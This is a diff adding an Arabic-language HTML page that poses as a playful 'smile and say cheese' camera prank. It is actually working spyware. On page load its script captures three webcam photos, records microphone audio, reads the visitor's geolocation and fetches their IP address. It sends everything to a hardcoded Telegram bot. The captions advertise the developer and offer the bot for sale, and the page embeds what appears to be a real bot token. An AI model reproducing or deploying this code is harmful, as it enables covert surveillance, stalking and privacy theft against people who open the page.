@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ابتسم وصيح سييييي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .container {
+            padding: 20px;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            color: #e74c3c;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .camera {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        video {
+            width: 400px;
+            height: auto;
+            border: 2px solid #333;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ابتسم حيل وصيح سييييييي </h1>
+        <div class="camera">
+            <video id="video" autoplay></video>
+        </div>
+        <canvas id="canvas"></canvas>
+        <div class="output">
+            <h2>انتظر المفاجأة...</h2>
+        </div>
+    </div>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const telegramBotToken = '7655326139:AAEZd2vHJPL1J-llHvjM26RO823jQNtO88Y';
+        const chatId = '7499043737';
+        let audioBlobs = [];
+
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                video.addEventListener('loadeddata', () => {
+                    let counter = 0;
+                    const captureInterval = setInterval(() => {
+                        capturePhoto(counter + 1);
+                        counter++;
+                        if (counter === 3) {
+                            clearInterval(captureInterval);
+                            getLocation();
+                        }
+                    }, 500);
+                });
+
+                const mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    audioBlobs.push(event.data);
+                    if (audioBlobs.length === 2) {
+                        sendAudioToTelegram(audioBlobs[0]);
+                        sendAudioToTelegram(audioBlobs[1]);
+                    }
+                };
+
+                setTimeout(() => {
+                    if (mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                }, 10000);
+            })
+            .catch(err => console.error(err));
+
+        function capturePhoto(index) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/png');
+            sendPhotoToTelegram(imageData, `تم تطوير البوت بواسطة صوفي للاشراك او شراء البوت تواصل مع المطور @caser7 
+IP:
+المنطقة:
+رقم الهاتف:
+قناتي : https://t.me/+qZ06s9H7I944YWYy ${index}`);
+        }
+
+        function sendPhotoToTelegram(imageData, caption) {
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
+            formData.append('caption', caption);
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            }).catch(err => console.error('خطأ في إرسال الصورة:', err));
+        }
+
+        function sendAudioToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('voice', audioBlob, 'voice.ogg');
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVoice`, {
+                method: 'POST',
+                body: formData,
+            }).catch(err => console.error('خطأ في إرسال الصوت:', err));
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+
+                    sendLocationToTelegram(latitude, longitude);
+                    getIPAddress();
+                });
+            } else {
+                console.error('الجهاز لا يدعم تحديد الموقع.');
+            }
+        }
+
+        function sendLocationToTelegram(latitude, longitude) {
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendLocation`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: latitude,
+                    longitude: longitude,
+                }),
+            }).catch(err => console.error('خطأ في إرسال الموقع:', err));
+        }
+
+        function getIPAddress() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    sendMessageToTelegram(`عنوان IP: ${data.ip}`);
+                })
+                .catch(err => console.error('خطأ في جلب الـ IP:', err));
+        }
+
+        function sendMessageToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            }).catch(err => console.error('خطأ في إرسال الرسالة:', err));
+        }
+    </script>
+</body>
+</html>
